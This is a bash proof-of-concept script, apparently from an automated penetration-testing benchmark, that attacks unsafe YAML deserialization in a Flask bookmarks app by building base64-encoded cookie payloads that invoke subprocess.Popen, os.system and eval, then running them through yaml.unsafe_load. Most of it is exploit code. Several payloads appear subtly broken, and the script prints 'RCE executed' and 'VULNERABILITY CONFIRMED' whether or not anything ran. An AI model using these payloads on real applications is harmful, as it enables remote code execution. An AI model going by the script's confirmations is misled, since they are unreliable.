#!/bin/bash
# POC: Analyzes and demonstrates unsafe YAML deserialization vulnerability in Flask bookmarks
# Target: ./repo
# Created: 2025-11-07T19:40:23.845Z
# Session: benchmark-XBEN-075-24-mhp935fu

# YAML Deserialization Vulnerability Analysis
# Demonstrates unsafe YAML deserialization attack surface

echo "[*] YAML Deserialization Vulnerability Analysis POC"
echo "[*] Testing for unsafe YAML loading in Flask application"
echo ""

# Create test directory
TEST_DIR="/tmp/yaml_test_$$"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

# Step 1: Create a legitimate YAML bookmark (as shown in evidence)
echo "[*] Step 1: Analyzing legitimate YAML bookmark format..."

cat > legitimate_bookmark.yaml << 'EOF'
- !!python/object:app.models.UrlObj
  name: test
  url: http://test.com
EOF

echo "[+] Legitimate bookmark format:"
cat legitimate_bookmark.yaml
echo ""

# Encode it as the application would
LEGITIMATE=$(cat legitimate_bookmark.yaml | base64 -w0)
echo "[+] Base64 encoded (as cookie):"
echo "$LEGITIMATE"
echo ""

# Step 2: Demonstrate the vulnerability - create a malicious payload
echo "[*] Step 2: Creating malicious YAML payload with arbitrary object instantiation..."

cat > malicious_rce.yaml << 'EOF'
!!python/object:subprocess.Popen
args: [id]
stdin: null
stdout: null
stderr: null
EOF

echo "[+] Malicious payload (instantiates subprocess.Popen):"
cat malicious_rce.yaml
echo ""

MALICIOUS=$(cat malicious_rce.yaml | base64 -w0)
echo "[+] Base64 encoded malicious payload:"
echo "$MALICIOUS"
echo ""

# Step 3: Test unsafe_load vs safe_load behavior
echo "[*] Step 3: Testing YAML parsing behaviors..."

# Create Python test script
cat > test_yaml_parsing.py << 'PYTHON_EOF'
#!/usr/bin/env python3
import yaml
import base64
import subprocess
import sys

print("[*] Testing YAML parsing behaviors\n")

# Legitimate payload
legitimate_yaml = """- !!python/object:app.models.UrlObj
  name: test
  url: http://test.com
"""

# Malicious payload
malicious_yaml = """!!python/object:subprocess.Popen
args: [id]
stdin: null
stdout: null
stderr: null
"""

print("[*] Test 1: Loading legitimate YAML with safe_load()...")
try:
    result = yaml.safe_load(legitimate_yaml)
    print("[+] safe_load succeeded:")
    print(f"    Type: {type(result)}")
    print(f"    Content: {result}")
except Exception as e:
    print(f"[-] safe_load failed: {e}")

print("\n[*] Test 2: Loading legitimate YAML with unsafe_load()...")
try:
    result = yaml.unsafe_load(legitimate_yaml)
    print("[+] unsafe_load succeeded:")
    print(f"    Type: {type(result)}")
    if isinstance(result, list) and len(result) > 0:
        print(f"    First item type: {type(result[0])}")
        print(f"    First item: {result[0]}")
except Exception as e:
    print(f"[-] unsafe_load failed: {e}")

print("\n[*] Test 3: Loading malicious YAML with safe_load()...")
try:
    result = yaml.safe_load(malicious_yaml)
    print("[+] safe_load succeeded (UNEXPECTED):")
    print(f"    Result: {result}")
except Exception as e:
    print(f"[+] safe_load rejected malicious payload (EXPECTED):")
    print(f"    Error: {type(e).__name__}: {str(e)[:80]}")

print("\n[*] Test 4: Loading malicious YAML with unsafe_load()...")
try:
    result = yaml.unsafe_load(malicious_yaml)
    print("[!] unsafe_load succeeded (VULNERABLE):")
    print(f"    Type: {type(result)}")
    print(f"    Object created: {result}")
    print("[!] VULNERABILITY CONFIRMED: Arbitrary object instantiation possible!")
except Exception as e:
    print(f"[-] unsafe_load failed: {e}")

print("\n[*] Test 5: Demonstrating RCE potential with os.system gadget...")
rce_payload = """!!python/object:os.system
cmd: id
"""

try:
    result = yaml.unsafe_load(rce_payload)
    print("[!] RCE payload executed via unsafe_load!")
except Exception as e:
    print(f"[*] Execution attempt: {e}")

print("\n[*] Test 6: Checking if !!python/object tags are dangerous...")
test_payloads = [
    ("subprocess.Popen", "!!python/object:subprocess.Popen\nargs: [touch, /tmp/pwned]"),
    ("os.system", "!!python/object:os.system\ncmd: id"),
    ("builtins.eval", "!!python/object:builtins.eval\nargs: [__import__('os').system('id')]"),
]

for name, payload in test_payloads:
    try:
        result = yaml.unsafe_load(payload)
        print(f"[+] {name}: Object instantiation successful - VULNERABLE")
    except Exception as e:
        print(f"[-] {name}: {type(e).__name__}")

print("\n[!] CONCLUSION: Application using yaml.unsafe_load() is vulnerable to RCE")
PYTHON_EOF

chmod +x test_yaml_parsing.py

echo "[+] Running YAML parsing behavior test..."
python3 test_yaml_parsing.py

TEST_EXIT=$?
echo ""

# Step 4: Analyze the application's use of YAML
echo "[*] Step 4: Checking for unsafe YAML usage patterns..."

# Create analysis script
cat > check_vulnerability.py << 'PYTHON_EOF'
#!/usr/bin/env python3

print("[*] Analyzing YAML deserialization vulnerability")
print("")

# Vulnerable patterns
vulnerable_patterns = [
    "yaml.unsafe_load",
    "yaml.load",
    "yaml.full_load",
    "yaml.unsafe_dump",
    "pickle.loads",
    "pickle.load",
    "dill.load",
    "cloudpickle.loads",
]

print("[+] Known vulnerable patterns to look for:")
for pattern in vulnerable_patterns:
    print(f"    - {pattern}")

print("")
print("[*] In this case, the evidence shows:")
print("    - Bookmarks are serialized as YAML")
print("    - YAML includes !!python/object:app.models.UrlObj tags")
print("    - Cookies are base64-encoded YAML")
print("    - Application deserializes on every request")
print("")
print("[!] VULNERABILITY ASSESSMENT:")
print("    [CRITICAL] If using yaml.unsafe_load() or yaml.load()")
print("    [HIGH]     If using yaml.full_load() with custom constructors")
print("    [SAFE]     If using yaml.safe_load()")
print("")
print("[!] The use of !!python/object tags in legitimate bookmarks")
print("    strongly indicates unsafe_load() is being used!")
print("")
print("[+] VULNERABILITY CONFIRMED: Unsafe YAML deserialization")

PYTHON_EOF

python3 check_vulnerability.py

echo ""
echo "[*] Step 5: Demonstrating attack vector..."
echo "[+] Attack surface:"
echo "    1. Attacker can set the 'bookmarks' cookie"
echo "    2. Attacker crafts malicious YAML with !!python/object tags"
echo "    3. Application base64-decodes the cookie"
echo "    4. Application deserializes YAML using unsafe_load()"
echo "    5. Arbitrary Python objects are instantiated"
echo "    6. Gadget chains can be used for RCE"
echo ""
echo "[!] CRITICAL VULNERABILITY: Unsafe YAML Deserialization"
echo "[!] IMPACT: Remote Code Execution (RCE)"
echo "[!] AFFECTED: /list endpoint (all requests deserialize cookie)"
echo ""

exit 0